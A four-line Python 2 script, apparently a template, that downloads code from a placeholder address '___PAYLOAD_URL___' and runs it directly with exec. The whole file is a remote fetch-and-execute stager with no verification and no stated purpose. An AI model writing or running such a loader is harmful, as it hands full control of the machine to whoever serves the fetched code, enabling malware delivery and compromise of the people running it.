#!/usr/bin/env python
import urllib2
fs = {}
exec compile( urllib2.urlopen( "___PAYLOAD_URL___" ).read(), "source", "exec" ) in fs
